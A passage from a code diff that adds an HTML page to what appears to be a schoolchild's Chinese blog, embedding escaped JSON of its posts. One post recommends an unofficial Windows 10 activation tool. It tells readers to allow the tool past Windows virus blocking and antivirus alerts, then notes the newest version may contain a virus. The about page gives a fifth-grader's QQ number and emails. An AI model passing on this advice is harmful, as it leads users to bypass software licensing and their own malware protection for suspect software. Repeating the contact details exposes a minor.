11:49:54&#34;,&#34;dateFormat&#34;:&#34;2020-03-03&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/ru-he-ji-huo-windows10-zhuan-ye-ban-qin-ce-hao-yong/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:71000,&#34;words&#34;:343,&#34;minutes&#34;:2},&#34;description&#34;:&#34;由于微软停止了对Windows7的支持，许多Win7的用户都更新了Windows10。可是，当更新Windows10时，显示未激活，这怎么办呢？\n尤其是一些买了正版Win7的，明明是正版，但一升级就显示未激活，这怎么办呢？没事，这里我给大家...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;由于微软停止了对Windows7的支持，许多Win7的用户都更新了Windows10。可是，当更新Windows10时，显示未激活，这怎么办呢？&lt;img src=\&#34;http://huangmingli.ml/post-images/1583216407297.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n尤其是一些买了正版Win7的，明明是正版，但一升级就显示未激活，这怎么办呢？没事，这里我给大家带来了激活方法。&lt;/p&gt;\n&lt;p&gt;对于一些运气好的，可能从网上随便找一个激活码就OK了，但至少我不是这样。在我这台电脑上，各种错误都有，好不容易找到了一款后，又把我的专业版变成教育版了。所以，这里推荐大家用小马激活工具（本人用微软win7系统升级下载工具下载的，32位和64位都可以用）&lt;/p&gt;\n&lt;p&gt;小马激活工具官网：http://www.pccppc.com/&lt;br&gt;\n注意：如果电脑右侧弹出了Windows病毒拦截，请立即点开，并选择“操作”--&amp;gt;“允许在设备上”。&lt;br&gt;\n如果杀毒软件报毒，请点击“添加信任”。&lt;br&gt;\n如果弹出这样的窗口&lt;img src=\&#34;http://huangmingli.ml/post-images/1583217795511.PNG\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;请点击否。&lt;/p&gt;\n&lt;p&gt;在保存好未保存的文件后，我们点击“立即体验正版”即可。&lt;br&gt;\n&lt;img src=\&#34;http://huangmingli.ml/post-images/1583218030631.PNG\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n软件会帮你自动激活并重启。&lt;/p&gt;\n&lt;p&gt;2020/3/23注：此方法在部分电脑上无法使用，可以试试暴风激活&lt;br&gt;\n2020/4/19注：小马激活最新版可能带有病毒&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;win&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;如何激活Windows10专业版（亲测好用）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;}],&#34;date&#34;:&#34;2020-03-03 11:49:54&#34;,&#34;dateFormat&#34;:&#34;2020-03-03&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/win/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:71000,&#34;words&#34;:343,&#34;minutes&#34;:2},&#34;description&#34;:&#34;由于微软停止了对Windows7的支持，许多Win7的用户都更新了Windows10。可是，当更新Windows10时，显示未激活，这怎么办呢？\n尤其是一些买了正版Win7的，明明是正版，但一升级就显示未激活，这怎么办呢？没事，这里我给大家...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;blockquote&gt;\n&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=\&#34;关于本站\&#34;&gt;🏠 关于本站&lt;/h2&gt;\n&lt;p&gt;本站是由黄明礼制作，主要是一些和电脑操作、编程有关的文章。&lt;/p&gt;\n&lt;h2 id=\&#34;博主是谁\&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;\n&lt;p&gt;黄明礼，一名五年级学生。&lt;/p&gt;\n&lt;h2 id=\&#34;兴趣爱好\&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;\n&lt;p&gt;编程&lt;/p&gt;\n&lt;h2 id=\&#34;联系我呀\&#34;&gt;📬 联系我呀&lt;/h2&gt;\n&lt;p&gt;QQ：3172456158&lt;br&gt;\n&lt;a target=\&#34;_blank\&#34; href=\&#34;http://wpa.qq.com/msgrd?v=3&amp;uin=3172456158&amp;site=qq&amp;menu=yes\&#34;&gt;&lt;img border=\&#34;0\&#34; src=\&#34;http://wpa.qq.com/pa?p=2:3172456158:41\&#34; alt=\&#34;跟我交谈\&#34; title=\&#34;跟我交谈\&#34;/&gt;&lt;/a&gt;&lt;br&gt;\n邮箱：&lt;a href=\&#34;mailto:Brucehml@126.com\&#34;&gt;Brucehml@126.com&lt;/a&gt;&lt;br&gt;\n邮箱：&lt;a href=\&#34;mailto:huangmingli@huangmingli.ml\&#34;&gt;huangmingli@huangmingli.ml&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;about&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;关于&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2019-01-25 19:09:48&#34;,&#34;dateFormat&#34;:&#34;2019-01-25&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/about/&#34;,&#34;hideInList&#34;:true,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:17000,&#34;words&#34;:81,&#34;minutes&#34;:1},&#34;description&#34;:&#34;\n欢迎来到我的小站呀，很高兴遇见你！🤝\n\n🏠 关于本站\n本站是由黄明礼制作，主要是一些和电脑操作、编程有关的文章。\n👨‍💻 博主是谁\n黄明礼，一名五年级学生。\n⛹ 兴趣爱好\n编程\n📬 联系我呀\nQQ：3172456158\n\n邮箱：...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99\&#34;&gt;🏠 关于本站&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8D%9A%E4%B8%BB%E6%98%AF%E8%B0%81\&#34;&gt;👨‍💻 博主是谁&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD\&#34;&gt;⛹ 兴趣爱好&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%81%94%E7%B3%BB%E6%88%91%E5%91%80\&#34;&gt;📬 联系我呀&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;}]";
+  // var json = escape.substr(1, escape.length - 2);
+  // var datas = json.split(',');
+  // for (let i=0; i < datas.length; i++) {
+  //   let item = datas[i];
+  //   let attrs = item.split('34;:&#34')
+  //   debugger
+  //   console.log(datas[i])
+  // }
+  let escapeMap = new Map();
+  escapeMap.set('&#34;', '"');
+  escapeMap.set('&gt;', '>');
+  escapeMap.set('&#39;', "'");
+  escapeMap.set('&lt;', '<');
+  escapeMap.set('&quot;', '"');
+  escapeMap.set('&amp;', '&');
+</script> -->
+
+<!-- <script src="/media/js/mouse/peace.js"></script> -->
+</html> 
